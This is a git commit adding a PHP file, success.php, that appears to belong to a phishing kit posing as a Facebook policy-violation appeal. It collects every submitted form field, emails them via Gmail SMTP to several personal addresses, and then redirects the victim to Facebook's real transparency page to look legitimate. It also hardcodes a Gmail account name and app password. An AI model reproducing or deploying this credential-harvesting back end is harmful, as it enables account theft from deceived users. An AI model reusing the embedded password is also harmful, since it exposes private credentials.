01a73364e82d99c742fb485fed26980b07dac0f8
Appeal-Voilation-Policy-Issues <169040075+Appeal-Voilation-Policy-Issues@users.noreply.github.com>
2024-05-09 14:29:26 -0700

    HTML

---
+++ success.php
@@ -0,0 +1,60 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+header("Location: https://transparency.fb.com/en-gb/policies/");
+
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
+    $emailBody = '';
+
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+    }
+
+
+
+    // PHPMailer object creation
+    $mail = new PHPMailer(true);
+
+    try {
+        // SMTP settings
+        $mail->isSMTP();
+        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'abdulsamadabd093@gmail.com'; // Replace with your email address
+        $mail->Password   = 'cyfp bgtb poon smnu'; // Replace with your email password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+
+        // Email properties
+        $mail->setFrom('abdulsamadabd093@gmail.com', 'PROFESSOR');
+        $mail->addAddress('abdulsam999999@gmail.com');
+       $mail->addAddress( 'tufailm7358@gmail.com');
+      $mail->addAddress('worker email');
+
+
+      // Email recipient's address
+
+        // Email content
+        $mail->isHTML(true);
+        $mail->Subject = 'worker name';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
+        
+        // Send email
+        $mail->send();
+        echo 'Email successfully sent using PHPMailer.';
+    } catch (Exception $e) {
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+    }
+} else {
+    echo "Invalid request!";
+}
+?>
